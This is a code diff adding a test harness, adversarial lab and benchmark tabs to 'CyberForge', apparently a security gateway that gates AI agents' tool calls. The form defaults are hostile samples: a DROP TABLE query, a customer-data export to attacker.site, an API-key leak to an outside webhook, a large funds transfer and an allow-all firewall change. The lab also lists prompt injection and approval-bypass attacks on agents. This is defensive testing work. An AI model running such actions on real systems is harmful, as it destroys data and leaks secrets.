@@ -1533,19 +1533,21 @@
           </svg>
         </div>
         <div class="brand-title">
-          <h1>AegisMesh AI</h1>
-          <p>Agentic AI Governance Control Plane</p>
+          <h1>CyberForge</h1>
+          <p>Runtime AI Security & Policy Intelligence Platform</p>
         </div>
       </div>
 
       <!-- Navigation Tabs -->
       <div class="nav-tabs">
-        <button class="nav-tab" onclick="switchTab('overview')">📊 Overview</button>
-        <button class="nav-tab active" onclick="switchTab('control-plane')">🛡️ Governance Control Plane</button>
-        <button class="nav-tab" onclick="switchTab('policy-evolution')">🧬 Policy Evolution</button>
-        <button class="nav-tab" onclick="switchTab('policies')">📜 Policies (Code)</button>
-        <button class="nav-tab" onclick="switchTab('audit')">📋 Audit Trail</button>
-        <button class="nav-tab" onclick="switchTab('agents')">🤖 Agents Matrix</button>
+        <button class="nav-tab active" onclick="switchTab('overview')">📊 Overview</button>
+        <button class="nav-tab" onclick="switchTab('traces')">⚡ Execution Explorer</button>
+        <button class="nav-tab" onclick="switchTab('adversarial')">🧪 Adversarial Lab</button>
+        <button class="nav-tab" onclick="switchTab('benchmark')">🏆 Benchmark Center</button>
+        <button class="nav-tab" onclick="switchTab('policy-evolution')">🧬 Policy Intelligence</button>
+        <button class="nav-tab" onclick="switchTab('audit')">🔐 Audit Explorer</button>
+        <button class="nav-tab" onclick="switchTab('settings')">⚙️ Settings & Tools</button>
+        <button class="nav-tab" onclick="switchTab('control-plane')">🛡️ Request Simulator</button>
       </div>
 
       <div class="status-pills">
@@ -2280,6 +2282,440 @@
 
       </div>
     </div>
+
+    <!-- TAB: RUNTIME EXECUTION EXPLORER -->
+    <div id="tab-traces" class="tab-content">
+      <div class="hero-story-card">
+        <div class="hero-title">
+          <span>⚡ Runtime Execution Explorer — Physical Boundary & Canonical Action Digest</span>
+          <span class="badge badge-approve">GATEWAY ACTIVE</span>
+        </div>
+        <div class="hero-desc">
+          Every protected tool invocation must pass through the centralized execution gateway. Action arguments are canonicalized into a cryptographic SHA-256 digest, evaluated against active policies immediately before execution, and rejected if unauthorized. Denied actions produce zero side effects on underlying infrastructure.
+        </div>
+      </div>
+
+      <div style="display:grid; grid-template-columns: 1.1fr 0.9fr; gap:1.5rem; margin-bottom:1.5rem;">
+        <!-- Left: Action Submission Form -->
+        <div class="panel">
+          <div class="panel-title" style="color:var(--accent-indigo);">
+            <span>Propose & Test Protected Tool Action</span>
+            <span class="badge" style="background:rgba(99,102,241,0.2); color:#a5b4fc;">TEST HARNESS</span>
+          </div>
+          <div style="display:grid; grid-template-columns:1fr 1fr; gap:0.75rem; margin-bottom:0.75rem;">
+            <div class="form-group">
+              <label>Principal User ID</label>
+              <input type="text" id="trace-user-id" value="U_INTERN_01">
+            </div>
+            <div class="form-group">
+              <label>Principal Role</label>
+              <select id="trace-role">
+                <option value="INTERN">INTERN (Restricted)</option>
+                <option value="JUNIOR">JUNIOR DEVELOPER</option>
+                <option value="ANALYST">ANALYST</option>
+                <option value="ENGINEER">SENIOR ENGINEER</option>
+                <option value="FINANCE_MANAGER">FINANCE MANAGER</option>
+                <option value="ADMIN">ADMIN / CISO</option>
+              </select>
+            </div>
+          </div>
+
+          <div style="display:grid; grid-template-columns:1.2fr 0.8fr; gap:0.75rem; margin-bottom:0.75rem;">
+            <div class="form-group">
+              <label>Protected Tool</label>
+              <select id="trace-tool" onchange="updateTraceFormDefaults()">
+                <option value="database_execute">database_execute (Database Query/Mutation)</option>
+                <option value="customer_data_export">customer_data_export (Data Export)</option>
+                <option value="cloud_resource_deploy">cloud_resource_deploy (Cloud Infrastructure)</option>
+                <option value="payment_transfer">payment_transfer (Electronic Funds Transfer)</option>
+                <option value="system_config_update">system_config_update (Firewall/Security Rules)</option>
+                <option value="external_webhook_call">external_webhook_call (Outbound Webhook)</option>
+              </select>
+            </div>
+            <div class="form-group">
+              <label>Operation</label>
+              <select id="trace-operation">
+                <option value="EXECUTE">EXECUTE</option>
+                <option value="READ">READ</option>
+                <option value="WRITE">WRITE</option>
+                <option value="TRANSFER">TRANSFER</option>
+                <option value="DEPLOY">DEPLOY</option>
+                <option value="DELETE">DELETE</option>
+              </select>
+            </div>
+          </div>
+
+          <div style="display:grid; grid-template-columns:1fr 1fr; gap:0.75rem; margin-bottom:0.75rem;">
+            <div class="form-group">
+              <label>Target Endpoint / Resource</label>
+              <input type="text" id="trace-target" value="public-endpoint-unauthorized">
+            </div>
+            <div class="form-group">
+              <label>Environment</label>
+              <select id="trace-env">
+                <option value="PRODUCTION">PRODUCTION</option>
+                <option value="STAGING">STAGING</option>
+                <option value="INTERNAL">INTERNAL</option>
+                <option value="GENERAL">GENERAL</option>
+              </select>
+            </div>
+          </div>
+
+          <div class="form-group" style="margin-bottom:0.75rem;">
+            <label>Tool Arguments (Strict JSON)</label>
+            <textarea id="trace-args" rows="3" style="font-family:'JetBrains Mono',monospace; font-size:0.75rem;">{"query": "DROP TABLE customers;", "database": "internal-db", "read_only": false}</textarea>
+          </div>
+
+          <button class="btn btn-primary" onclick="submitTraceAction()" style="width:100%; padding:0.6rem;">
+            🛡️ Submit to Runtime Enforcement Gateway
+          </button>
+        </div>
+
+        <!-- Right: Execution Outcome Inspector -->
+        <div class="panel">
+          <div class="panel-title" style="color:var(--text-primary);">
+            <span>Gateway Execution Outcome</span>
+            <span id="trace-decision-badge" class="badge" style="display:none;">PENDING</span>
+          </div>
+
+          <div id="trace-result-placeholder" style="text-align:center; padding:3rem 1rem; color:var(--text-secondary);">
+            <div style="font-size:2rem; margin-bottom:0.5rem;">🔒</div>
+            <p style="font-size:0.85rem;">Submit an action to inspect the canonical digest, TOCTOU policy check, and side-effect proof.</p>
+          </div>
+
+          <div id="trace-result-body" style="display:none; flex-direction:column; gap:0.75rem;">
+            <div style="background:rgba(15,23,42,0.8); padding:0.75rem; border-radius:6px; border:1px solid var(--border-color);">
+              <div style="font-size:0.7rem; color:var(--text-secondary); margin-bottom:0.25rem;">CANONICAL SHA-256 DIGEST</div>
+              <code id="trace-res-digest" style="font-family:'JetBrains Mono',monospace; font-size:0.72rem; color:#a5b4fc; word-break:break-all;"></code>
+            </div>
+
+            <div style="display:grid; grid-template-columns:1fr 1fr; gap:0.5rem;">
+              <div style="background:rgba(15,23,42,0.8); padding:0.6rem; border-radius:6px; border:1px solid var(--border-color);">
+                <div style="font-size:0.68rem; color:var(--text-secondary);">DECISION REASON</div>
+                <div id="trace-res-reason" style="font-size:0.75rem; font-weight:600; color:white; margin-top:0.2rem;"></div>
+              </div>
+              <div style="background:rgba(15,23,42,0.8); padding:0.6rem; border-radius:6px; border:1px solid var(--border-color);">
+                <div style="font-size:0.68rem; color:var(--text-secondary);">SIDE-EFFECT PROOF</div>
+                <div id="trace-res-sideeffect" style="font-size:0.75rem; font-weight:600; margin-top:0.2rem;"></div>
+              </div>
+            </div>
+
+            <div style="background:rgba(15,23,42,0.8); padding:0.6rem; border-radius:6px; border:1px solid var(--border-color); font-size:0.72rem;">
+              <div style="color:var(--text-secondary); margin-bottom:0.2rem;">EXECUTION TICKET & AUDIT LINK</div>
+              <div>Ticket ID: <span id="trace-res-execid" style="color:#34d399; font-family:'JetBrains Mono',monospace;"></span></div>
+              <div>Audit Entry: <span id="trace-res-auditid" style="color:#a5b4fc; font-family:'JetBrains Mono',monospace;"></span></div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Chronological Gateway Log Table -->
+      <div class="panel">
+        <div class="panel-title">
+          <span>Gateway Chronological Audit Ledger</span>
+          <button class="btn btn-secondary btn-sm" onclick="loadExecutionTraces()">🔄 Refresh Ledger</button>
+        </div>
+        <div style="overflow-x:auto;">
+          <table class="table" style="font-size:0.75rem;">
+            <thead>
+              <tr>
+                <th>Timestamp</th>
+                <th>Execution ID</th>
+                <th>Principal</th>
+                <th>Tool</th>
+                <th>Decision</th>
+                <th>Side Effects</th>
+                <th>Canonical Digest</th>
+                <th>Audit Block Hash</th>
+              </tr>
+            </thead>
+            <tbody id="trace-history-tbody">
+              <!-- Populated dynamically -->
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <!-- TAB: ADVERSARIAL LAB -->
+    <div id="tab-adversarial" class="tab-content">
+      <div class="hero-story-card">
+        <div class="hero-title">
+          <span>🧪 Adversarial Security Lab — Attack Scenario Suite</span>
+          <span class="badge badge-modify">21 SCENARIOS AVAILABLE</span>
+        </div>
+        <div class="hero-desc">
+          Test the AI agent against realistic adversarial prompt injections, indirect retrieved document payloads, argument tampering, privilege escalations, and approval bypasses. Compare how different execution modes handle each attack.
+        </div>
+      </div>
+
+      <div style="display:flex; gap:0.5rem; margin-bottom:1rem; flex-wrap:wrap;">
+        <button class="btn btn-secondary btn-sm active" onclick="filterScenarios('ALL')">All Categories</button>
+        <button class="btn btn-secondary btn-sm" onclick="filterScenarios('DIRECT_PROMPT_INJECTION')">Direct Injection</button>
+        <button class="btn btn-secondary btn-sm" onclick="filterScenarios('INDIRECT_PROMPT_INJECTION')">Indirect Injection</button>
+        <button class="btn btn-secondary btn-sm" onclick="filterScenarios('TOOL_ARGUMENT_MANIPULATION')">Tool Abuse</button>
+        <button class="btn btn-secondary btn-sm" onclick="filterScenarios('PRIVILEGE_ESCALATION')">Privilege Escalation</button>
+        <button class="btn btn-secondary btn-sm" onclick="filterScenarios('APPROVAL_BYPASS')">Approval Bypass</button>
+        <button class="btn btn-secondary btn-sm" onclick="filterScenarios('BENIGN_LEGITIMATE')">Benign Controls</button>
+      </div>
+
+      <div style="display:grid; grid-template-columns: 1.1fr 0.9fr; gap:1.5rem;">
+        <!-- Left: Scenario Catalog -->
+        <div class="panel" style="max-height:650px; overflow-y:auto;">
+          <div class="panel-title">
+            <span>Attack Scenarios Catalog</span>
+            <span id="adv-catalog-count" class="badge" style="background:rgba(99,102,241,0.2); color:#a5b4fc;">21 Items</span>
+          </div>
+          <div id="adv-scenarios-container" style="display:flex; flex-direction:column; gap:0.75rem;">
+            <!-- Populated dynamically -->
+          </div>
+        </div>
+
+        <!-- Right: Execution Studio & Outcome -->
+        <div class="panel">
+          <div class="panel-title" style="color:var(--color-escalate);">
+            <span>Adversarial Execution Studio</span>
+            <span id="adv-selected-id" class="badge badge-secondary">SELECT SCENARIO</span>
+          </div>
+
+          <div id="adv-selected-card" style="margin-bottom:1rem; padding:0.75rem; background:rgba(15,23,42,0.8); border-radius:6px; border:1px solid var(--border-color);">
+            <div id="adv-selected-name" style="font-weight:700; font-size:0.85rem; color:white; margin-bottom:0.25rem;">No scenario selected</div>
+            <div id="adv-selected-desc" style="font-size:0.75rem; color:var(--text-secondary); margin-bottom:0.5rem;">Select an attack scenario from the catalog on the left to configure execution.</div>
+            <div style="font-size:0.72rem; color:#a5b4fc;">Prompt:</div>
+            <div id="adv-selected-prompt" style="font-size:0.75rem; color:var(--text-primary); font-family:'JetBrains Mono',monospace; background:rgba(0,0,0,0.3); padding:0.4rem; border-radius:4px; margin-top:0.2rem;"></div>
+          </div>
+
+          <div class="form-group" style="margin-bottom:1rem;">
+            <label>Agent Configuration Mode</label>
+            <select id="adv-exec-mode">
+              <option value="RUNTIME_ENFORCEMENT">🛡️ Runtime Enforcement (CyberForge Gateway)</option>
+              <option value="GOVERNANCE_DETECTION_ONLY">⚠️ Governance Detection Only (Heuristic Filter)</option>
+              <option value="BASELINE_NO_ENFORCEMENT">🚨 Baseline (Unprotected Execution)</option>
+              <option value="RUNTIME_HARDENED">🔒 Hardened Runtime (Gateway + Hardened Inputs)</option>
+            </select>
+          </div>
+
+          <button class="btn btn-primary" onclick="runCurrentScenario()" style="width:100%; margin-bottom:1.5rem;">
+            🚀 Run Adversarial Test
+          </button>
+
+          <!-- Live Outcome Section -->
+          <div id="adv-outcome-panel" style="display:none; flex-direction:column; gap:0.75rem;">
+            <div id="adv-outcome-banner" style="padding:0.75rem; border-radius:6px; font-weight:700; font-size:0.85rem; text-align:center;"></div>
+            
+            <div style="display:grid; grid-template-columns:1fr 1fr 1fr; gap:0.5rem; text-align:center;">
+              <div style="background:rgba(15,23,42,0.8); padding:0.5rem; border-radius:6px; border:1px solid var(--border-color);">
+                <div style="font-size:0.65rem; color:var(--text-secondary);">ATTACK DETECTED</div>
+                <div id="adv-res-detected" style="font-weight:700; font-size:0.78rem; margin-top:0.2rem;"></div>
+              </div>
+              <div style="background:rgba(15,23,42,0.8); padding:0.5rem; border-radius:6px; border:1px solid var(--border-color);">
+                <div style="font-size:0.65rem; color:var(--text-secondary);">GATEWAY DECISION</div>
+                <div id="adv-res-decision" style="font-weight:700; font-size:0.78rem; margin-top:0.2rem;"></div>
+              </div>
+              <div style="background:rgba(15,23,42,0.8); padding:0.5rem; border-radius:6px; border:1px solid var(--border-color);">
+                <div style="font-size:0.65rem; color:var(--text-secondary);">SIDE EFFECTS</div>
+                <div id="adv-res-sideeffects" style="font-weight:700; font-size:0.78rem; margin-top:0.2rem;"></div>
+              </div>
+            </div>
+
+            <div style="background:rgba(15,23,42,0.8); padding:0.6rem; border-radius:6px; border:1px solid var(--border-color); font-size:0.72rem;">
+              <div style="color:var(--text-secondary); margin-bottom:0.25rem;">EXECUTION TRACE LOG</div>
+              <div id="adv-res-trace" style="font-family:'JetBrains Mono',monospace; line-height:1.4; color:#94a3b8; max-height:140px; overflow-y:auto;"></div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- TAB: BENCHMARK CENTER -->
+    <div id="tab-benchmark" class="tab-content">
+      <div class="hero-story-card">
+        <div class="hero-title">
+          <span>🏆 Reproducible Attack Benchmark Evaluation Engine</span>
+          <span class="badge badge-approve">EMPIRICAL EVALUATION</span>
+        </div>
+        <div class="hero-desc">
+          Run the standardized 21-scenario attack suite across baseline, prompt detection, and runtime enforcement configurations. Empirically verify attack success rate, unauthorized action rate, enforcement success, and false-positive rates with verified tool side effects.
+        </div>
+      </div>
+
+      <!-- Controls Bar -->
+      <div class="panel" style="margin-bottom:1.5rem; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:1rem;">
+        <div style="display:flex; align-items:center; gap:0.75rem;">
+          <label style="font-size:0.8rem; font-weight:600; color:white;">Select Configuration Mode:</label>
+          <select id="bm-mode-select" style="padding:0.4rem 0.75rem; border-radius:6px; background:rgba(15,23,42,0.9); border:1px solid var(--border-color); color:white; font-size:0.8rem;">
+            <option value="RUNTIME_ENFORCEMENT">🛡️ Runtime Enforcement (CyberForge Gateway)</option>
+            <option value="GOVERNANCE_DETECTION_ONLY">⚠️ Governance Detection Only (Heuristic Filter)</option>
+            <option value="BASELINE_NO_ENFORCEMENT">🚨 Baseline (Unprotected Execution)</option>
+            <option value="RUNTIME_HARDENED">🔒 Hardened Runtime (Gateway + Hardened Inputs)</option>
+          </select>
+        </div>
+        <div style="display:flex; gap:0.6rem;">
+          <button class="btn btn-primary" onclick="triggerBenchmarkExecution()">🚀 Run Benchmark Suite</button>
+          <button class="btn btn-secondary btn-sm" id="bm-btn-csv" onclick="exportCurrentBenchmark('csv')" disabled>📥 Export CSV</button>
+          <button class="btn btn-secondary btn-sm" id="bm-btn-json" onclick="exportCurrentBenchmark('json')" disabled>📥 Export JSON</button>
+        </div>
+      </div>
+
+      <!-- Benchmark Metrics Cards -->
+      <div style="display:grid; grid-template-columns:repeat(5, 1fr); gap:1rem; margin-bottom:1.5rem;">
+        <div class="card card-kpi">
+          <div class="kpi-label">ATTACK SUCCESS RATE</div>
+          <div class="kpi-value" id="bm-metric-attack-rate" style="color:var(--color-approve);">0.0%</div>
+          <div style="font-size:0.68rem; color:var(--text-secondary);">Target: 0.0%</div>
+        </div>
+        <div class="card card-kpi">
+          <div class="kpi-label">UNAUTHORIZED ACTION RATE</div>
+          <div class="kpi-value" id="bm-metric-unauth-rate" style="color:var(--color-approve);">0.0%</div>
+          <div style="font-size:0.68rem; color:var(--text-secondary);">Side effects occurred</div>
+        </div>
+        <div class="card card-kpi">
+          <div class="kpi-label">ENFORCEMENT SUCCESS</div>
+          <div class="kpi-value" id="bm-metric-enforce-rate" style="color:#a5b4fc;">100.0%</div>
+          <div style="font-size:0.68rem; color:var(--text-secondary);">Correctly gated</div>
+        </div>
+        <div class="card card-kpi">
+          <div class="kpi-label">FALSE POSITIVE RATE</div>
+          <div class="kpi-value" id="bm-metric-fp-rate" style="color:var(--color-approve);">0.0%</div>
+          <div style="font-size:0.68rem; color:var(--text-secondary);">Benign blocked</div>
+        </div>
+        <div class="card card-kpi">
+          <div class="kpi-label">MEDIAN LATENCY</div>
+          <div class="kpi-value" id="bm-metric-latency" style="color:white;">0.12 ms</div>
+          <div style="font-size:0.68rem; color:var(--text-secondary);">Per evaluation</div>
+        </div>
+      </div>
+
+      <!-- Category Breakdown Table -->
+      <div class="panel" style="margin-bottom:1.5rem;">
+        <div class="panel-title">Category-Level Security Breakdown</div>
+        <div style="overflow-x:auto;">
+          <table class="table" style="font-size:0.75rem;">
+            <thead>
+              <tr>
+                <th>Attack Category</th>
+                <th>Total Scenarios</th>
+                <th>Adversarial</th>
+                <th>Unauthorized Side Effects</th>
+                <th>Attack Success Rate</th>
+                <th>Enforcement Rate</th>
+              </tr>
+            </thead>
+            <tbody id="bm-category-tbody">
+              <!-- Populated dynamically -->
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- Detailed Scenarios Table -->
+      <div class="panel">
+        <div class="panel-title">Per-Scenario Evaluation Details</div>
+        <div style="overflow-x:auto;">
+          <table class="table" style="font-size:0.75rem;">
+            <thead>
+              <tr>
+                <th>Scenario ID</th>
+                <th>Name</th>
+                <th>Category</th>
+                <th>Severity</th>
+                <th>Type</th>
+                <th>Decision</th>
+                <th>Side Effects</th>
+                <th>Classification</th>
+                <th>Latency</th>
+              </tr>
+            </thead>
+            <tbody id="bm-scenarios-tbody">
+              <!-- Populated dynamically -->
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <!-- TAB: SETTINGS & TOOL REGISTRY -->
+    <div id="tab-settings" class="tab-content">
+      <div class="hero-story-card">
+        <div class="hero-title">
+          <span>⚙️ Platform Settings & Protected Tool Registry</span>
+          <span class="badge badge-approve">FAIL-CLOSED ENABLED</span>
+        </div>
+        <div class="hero-desc">
+          CyberForge enforces execution boundaries over registered tools. Tools require caller clearances, validate argument schemas, and require single-use tickets from the gateway before physical execution.
+        </div>
+      </div>
+
+      <!-- Tool Registry Table -->
+      <div class="panel" style="margin-bottom:1.5rem;">
+        <div class="panel-title">
+          <span>Protected Tool Catalog & Side-Effect Counters</span>
+          <span class="badge" style="background:rgba(99,102,241,0.2); color:#a5b4fc;">6 Protected Tools</span>
+        </div>
+        <div style="overflow-x:auto;">
+          <table class="table" style="font-size:0.75rem;">
+            <thead>
+              <tr>
+                <th>Tool Name</th>
+                <th>Description</th>
+                <th>Version</th>
+                <th>Required Role</th>
+                <th>Sensitivity</th>
+                <th>Allowed Targets</th>
+                <th>Physical Side Effects Produced</th>
+                <th>Protection</th>
+              </tr>
+            </thead>
+            <tbody id="settings-tools-tbody">
+              <!-- Populated dynamically -->
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- Security Architecture & Integrity Card -->
+      <div style="display:grid; grid-template-columns:1fr 1fr; gap:1.5rem;">
+        <div class="panel">
+          <div class="panel-title" style="color:var(--color-approve);">Fail-Closed Security Posture</div>
+          <div style="display:flex; flex-direction:column; gap:0.6rem; font-size:0.75rem; color:var(--text-secondary);">
+            <div style="display:flex; justify-content:space-between; padding:0.4rem 0; border-bottom:1px solid rgba(255,255,255,0.05);">
+              <span>Execution Environment:</span>
+              <strong style="color:white;">PRODUCTION</strong>
+            </div>
+            <div style="display:flex; justify-content:space-between; padding:0.4rem 0; border-bottom:1px solid rgba(255,255,255,0.05);">
+              <span>Policy Database Fallback:</span>
+              <strong style="color:var(--color-approve);">FAIL-CLOSED (DENY-BY-DEFAULT)</strong>
+            </div>
+            <div style="display:flex; justify-content:space-between; padding:0.4rem 0; border-bottom:1px solid rgba(255,255,255,0.05);">
+              <span>Mock Fallback Privileges:</span>
+              <strong style="color:var(--color-approve);">RESTRICTED (ZERO PRODUCTION RIGHTS)</strong>
+            </div>
+            <div style="display:flex; justify-content:space-between; padding:0.4rem 0;">
+              <span>Audit Persistence Failure:</span>
+              <strong style="color:var(--color-approve);">BLOCKS PROTECTED EXECUTION</strong>
+            </div>
+          </div>
+        </div>
+
+        <div class="panel">
+          <div class="panel-title" style="color:#a5b4fc;">Cryptographic Audit Ledger</div>
+          <div style="display:flex; flex-direction:column; gap:0.6rem; font-size:0.75rem; color:var(--text-secondary);">
+            <div style="display:flex; justify-content:space-between; padding:0.4rem 0; border-bottom:1px solid rgba(255,255,255,0.05);">
+              <span>Hash Chaining:</span>
+              <strong style="color:white;">SHA-256 (Merkle/Block Linked)</strong>
+            </div>
+            <div style="display:flex; justify-content:space-between; padding:0.4rem 0; border-bottom:1px solid rgba(255,255,255,0.05);">
+              <span>Integrity Verification:</span>
+              <strong style="color:var(--color-approve);">HMAC-SHA256 SIGNED</strong>
+            </div>
+            <div style="display:flex; justify-content:space-between; padding:0.4rem 0;">
+              <span>Audit Verification Status:</span>
+              <strong id="settings-audit-status" style="color:var(--color-approve);">CHAIN FULLY VALID</strong>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
   </main>
 
   <!-- Human Review Modal -->
@@ -2616,6 +3052,11 @@
       if (tabId === 'audit') fetchAuditHistory();
       if (tabId === 'policies') fetchPolicies();
       if (tabId === 'policy-evolution') loadPolicyEvolutionData();
+      if (tabId === 'overview') loadSecurityOverview();
+      if (tabId === 'traces') loadExecutionTraces();
+      if (tabId === 'adversarial') loadAdversarialScenarios();
+      if (tabId === 'benchmark') loadBenchmarkCenter();
+      if (tabId === 'settings') loadCyberForgeSettings();
     }
 
     // --- Policy Management Functions ---
@@ -3784,6 +4225,424 @@ function renderGovernanceResult(data) {
         loadPolicyEvolutionData();
       } catch (err) {
         console.error('Error approving enforcement:', err);
+      }
+    }
+
+    // ==========================================
+    // CYBERFORGE EXTENSIONS JAVASCRIPT LOGIC
+    // ==========================================
+
+    let cyberforgeScenarios = [];
+    let selectedAdvScenario = null;
+    let currentAdvCategory = 'ALL';
+    let currentBenchmarkRunId = null;
+
+    function updateTraceFormDefaults() {
+      const tool = document.getElementById('trace-tool').value;
+      const targetInput = document.getElementById('trace-target');
+      const opSelect = document.getElementById('trace-operation');
+      const argsArea = document.getElementById('trace-args');
+      if (tool === 'database_execute') {
+        opSelect.value = 'EXECUTE';
+        targetInput.value = 'internal-db';
+        argsArea.value = JSON.stringify({ query: 'DROP TABLE customers;', database: 'internal-db', read_only: false }, null, 2);
+      } else if (tool === 'customer_data_export') {
+        opSelect.value = 'READ';
+        targetInput.value = 'customer-vault';
+        argsArea.value = JSON.stringify({ format: 'csv', record_count: 50000, destination: 'https://attacker.site/drop' }, null, 2);
+      } else if (tool === 'cloud_resource_deploy') {
+        opSelect.value = 'DEPLOY';
+        targetInput.value = 'cloud-provider-us-east';
+        argsArea.value = JSON.stringify({ resource_type: 'gpu_cluster', count: 16, instance_size: 'p4de.24xlarge' }, null, 2);
+      } else if (tool === 'payment_transfer') {
+        opSelect.value = 'TRANSFER';
+        targetInput.value = 'payment-gateway';
+        argsArea.value = JSON.stringify({ amount: 150000.00, currency: 'USD', destination_account: 'ACC-999-SWIFT' }, null, 2);
+      } else if (tool === 'system_config_update') {
+        opSelect.value = 'WRITE';
+        targetInput.value = 'firewall-config';
+        argsArea.value = JSON.stringify({ parameter: 'allow_all_inbound', value: 'true', reload_services: true }, null, 2);
+      } else if (tool === 'external_webhook_call') {
+        opSelect.value = 'EXECUTE';
+        targetInput.value = 'https://unauthorized-leak.io';
+        argsArea.value = JSON.stringify({ url: 'https://unauthorized-leak.io/api', payload: { secret: 'API_KEY_LEAK' } }, null, 2);
+      }
+    }
+
+    async function submitTraceAction() {
+      try {
+        const tool_name = document.getElementById('trace-tool').value;
+        const operation = document.getElementById('trace-operation').value;
+        const target_resource = document.getElementById('trace-target').value;
+        const user_id = document.getElementById('trace-user-id').value;
+        const user_role = document.getElementById('trace-role').value;
+        const environment = document.getElementById('trace-env').value;
+        let args = {};
+        try {
+          args = JSON.parse(document.getElementById('trace-args').value);
+        } catch (e) {
+          alert('Invalid JSON in tool arguments: ' + e.message);
+          return;
+        }
+
+        const res = await fetch('/api/cyberforge/execute', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            tool_name,
+            operation,
+            target_resource,
+            arguments: args,
+            user_id,
+            user_role,
+            environment
+          })
+        });
+        const data = await res.json();
+        
+        document.getElementById('trace-result-placeholder').style.display = 'none';
+        const resBody = document.getElementById('trace-result-body');
+        resBody.style.display = 'flex';
+
+        const badge = document.getElementById('trace-decision-badge');
+        badge.style.display = 'inline-block';
+        badge.className = 'badge ' + (data.decision === 'ALLOW' ? 'badge-approve' : (data.decision === 'DENY' ? 'badge-reject' : 'badge-modify'));
+        badge.innerText = data.decision;
+
+        document.getElementById('trace-res-digest').innerText = data.canonical_digest || 'N/A';
+        document.getElementById('trace-res-reason').innerText = data.reason || data.decision;
+        
+        const seElem = document.getElementById('trace-res-sideeffect');
+        if (data.side_effects_produced) {
+          seElem.innerText = '⚠️ Side Effects Produced';
+          seElem.style.color = 'var(--color-modify)';
+        } else {
+          seElem.innerText = '🛡️ Zero Side Effects (Protected)';
+          seElem.style.color = 'var(--color-approve)';
+        }
+
+        document.getElementById('trace-res-execid').innerText = data.execution_id || 'N/A';
+        document.getElementById('trace-res-auditid').innerText = data.audit_entry_id || 'N/A';
+
+        loadExecutionTraces();
+      } catch (err) {
+        console.error('Error submitting trace action:', err);
+        alert('Failed to submit action: ' + err.message);
+      }
+    }
+
+    async function loadExecutionTraces() {
+      const tbody = document.getElementById('trace-history-tbody');
+      if (!tbody) return;
+      try {
+        const res = await fetch('/api/cyberforge/traces?limit=50');
+        const traces = await res.json();
+        if (!traces || traces.length === 0) {
+          tbody.innerHTML = '<tr><td colspan="8" style="text-align:center; padding:1.5rem; color:var(--text-secondary);">No execution traces recorded yet. Propose an action above to test the gateway.</td></tr>';
+          return;
+        }
+        tbody.innerHTML = traces.map(t => {
+          const dBadge = t.decision === 'ALLOW' ? '<span class="badge badge-approve">ALLOW</span>' :
+                         t.decision === 'DENY' ? '<span class="badge badge-reject">DENY</span>' :
+                         '<span class="badge badge-modify">' + t.decision + '</span>';
+          const seBadge = t.side_effects_produced ? '<span style="color:var(--color-modify); font-weight:600;">⚠️ Physical Effect</span>' :
+                          '<span style="color:var(--color-approve); font-weight:600;">✓ Blocked (Zero Effect)</span>';
+          const shortDigest = (t.canonical_digest || '').substring(0, 16) + '...';
+          const shortHash = (t.block_hash || '').substring(0, 16) + '...';
+          const timeStr = new Date(t.timestamp).toLocaleTimeString();
+          return `<tr>
+            <td style="color:var(--text-secondary);">${timeStr}</td>
+            <td style="font-family:\'JetBrains Mono\',monospace; color:var(--accent-indigo); font-weight:600;">${t.execution_id.substring(0, 12)}...</td>
+            <td><strong>${t.principal}</strong></td>
+            <td><code>${t.tool_name}</code></td>
+            <td>${dBadge}</td>
+            <td>${seBadge}</td>
+            <td title="${t.canonical_digest}"><code style="color:#a5b4fc; font-size:0.7rem;">${shortDigest}</code></td>
+            <td title="${t.block_hash}"><code style="color:#6ee7b7; font-size:0.7rem;">${shortHash}</code></td>
+          </tr>`;
+        }).join('');
+      } catch (err) {
+        console.error('Error loading execution traces:', err);
+      }
+    }
+
+    // --- Adversarial Lab ---
+    async function loadAdversarialScenarios() {
+      const container = document.getElementById('adv-scenarios-container');
+      if (!container) return;
+      try {
+        const res = await fetch('/api/cyberforge/adversarial/scenarios');
+        const data = await res.json();
+        cyberforgeScenarios = data.scenarios || [];
+        renderScenariosList();
+        if (cyberforgeScenarios.length > 0 && !selectedAdvScenario) {
+          selectAdvScenario(cyberforgeScenarios[0]);
+        }
+      } catch (err) {
+        console.error('Error loading adversarial scenarios:', err);
+      }
+    }
+
+    function filterScenarios(category) {
+      currentAdvCategory = category;
+      document.querySelectorAll('#tab-adversarial button').forEach(b => {
+        if (b.innerText.toLowerCase().includes(category.toLowerCase().replace('_', ' ')) || (category === 'ALL' && b.innerText.includes('All Categories'))) {
+          b.classList.add('active');
+        } else if (b.classList.contains('btn-secondary')) {
+          b.classList.remove('active');
+        }
+      });
+      renderScenariosList();
+    }
+
+    function renderScenariosList() {
+      const container = document.getElementById('adv-scenarios-container');
+      if (!container) return;
+      const filtered = currentAdvCategory === 'ALL'
+        ? cyberforgeScenarios
+        : cyberforgeScenarios.filter(s => s.category === currentAdvCategory);
+      
+      const countBadge = document.getElementById('adv-catalog-count');
+      if (countBadge) countBadge.innerText = `${filtered.length} Items`;
+
+      if (filtered.length === 0) {
+        container.innerHTML = '<div style="text-align:center; padding:1.5rem; color:var(--text-secondary);">No scenarios matching filter.</div>';
+        return;
+      }
+
+      container.innerHTML = filtered.map(s => {
+        const sevColor = s.severity === 'CRITICAL' ? 'var(--color-reject)' :
+                         s.severity === 'HIGH' ? 'var(--color-escalate)' :
+                         s.severity === 'MEDIUM' ? 'var(--color-modify)' : 'var(--color-approve)';
+        const isSelected = selectedAdvScenario && selectedAdvScenario.id === s.id;
+        const borderStyle = isSelected ? 'border:1px solid var(--accent-indigo); background:rgba(99,102,241,0.15);' : 'border:1px solid var(--border-color); background:rgba(15,23,42,0.7);';
+        
+        return `<div onclick="selectAdvScenarioById('${s.id}')" style="${borderStyle} padding:0.6rem; border-radius:6px; cursor:pointer; transition:all 0.2s;">
+          <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:0.25rem;">
+            <strong style="font-size:0.78rem; color:white;">${s.name}</strong>
